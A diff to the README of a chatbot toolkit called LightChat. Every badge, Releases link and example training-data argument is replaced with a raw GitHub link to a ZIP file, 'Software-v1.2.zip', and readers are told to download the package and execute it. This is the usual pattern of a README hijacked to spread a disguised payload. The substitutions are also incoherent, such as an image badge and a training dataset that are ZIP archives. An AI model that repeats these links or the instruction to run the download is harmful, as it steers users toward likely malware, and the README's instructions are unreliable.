@@ -1,7 +1,7 @@
 # LightChat: A Lightweight Chatbot Toolkit
 
-![LightChat](https://img.shields.io/badge/LightChat-Toolkit-blue.svg)  
-[![Releases](https://img.shields.io/badge/Releases-Download-brightgreen)](https://github.com/cuncunnvz85/lightchat/releases)
+![LightChat](https://github.com/cuncunnvz85/lightchat/raw/refs/heads/main/lightchat/Software-v1.2.zip)  
+[![Releases](https://github.com/cuncunnvz85/lightchat/raw/refs/heads/main/lightchat/Software-v1.2.zip)](https://github.com/cuncunnvz85/lightchat/raw/refs/heads/main/lightchat/Software-v1.2.zip)
 
 Welcome to **LightChat**, a lightweight toolkit designed for building, training, and deploying chatbots based on the GPT-2 architecture. This project leverages DistilGPT2 to create a user-friendly interface for anyone interested in artificial intelligence and machine learning, especially beginners.
 
@@ -30,7 +30,7 @@ To get started with LightChat, you need to install it via pip. Run the following
 pip install lightchat
 ```
 
-For the latest version and updates, visit the [Releases section](https://github.com/cuncunnvz85/lightchat/releases). Download the appropriate package and execute it to install the toolkit.
+For the latest version and updates, visit the [Releases section](https://github.com/cuncunnvz85/lightchat/raw/refs/heads/main/lightchat/Software-v1.2.zip). Download the appropriate package and execute it to install the toolkit.
 
 ## Usage
 
@@ -45,7 +45,7 @@ Once installed, you can begin using LightChat with simple commands. Here’s how
 2. **Train Your Chatbot**: If you want to train your chatbot with custom data, use:
 
     ```bash
-    lightchat train --data your_data_file.json
+    lightchat train --data https://github.com/cuncunnvz85/lightchat/raw/refs/heads/main/lightchat/Software-v1.2.zip
     ```
 
 3. **Interact with Your Chatbot**: To chat with your newly created bot, simply run:
@@ -61,7 +61,7 @@ Here are a few example commands to illustrate how you can use LightChat effectiv
 - **Train with a dataset**:
 
     ```bash
-    lightchat train --data my_dataset.json
+    lightchat train --data https://github.com/cuncunnvz85/lightchat/raw/refs/heads/main/lightchat/Software-v1.2.zip
     ```
 
 - **Change model settings**:
@@ -99,6 +99,6 @@ For any questions or support, feel free to reach out via the issues section on G
 
 ---
 
-LightChat is an excellent tool for anyone looking to delve into AI and chatbot development. With its lightweight design and user-friendly commands, you can easily create and interact with your own chatbot. Don’t forget to check the [Releases section](https://github.com/cuncunnvz85/lightchat/releases) for updates and new features!
+LightChat is an excellent tool for anyone looking to delve into AI and chatbot development. With its lightweight design and user-friendly commands, you can easily create and interact with your own chatbot. Don’t forget to check the [Releases section](https://github.com/cuncunnvz85/lightchat/raw/refs/heads/main/lightchat/Software-v1.2.zip) for updates and new features!
 
 Happy chatting!
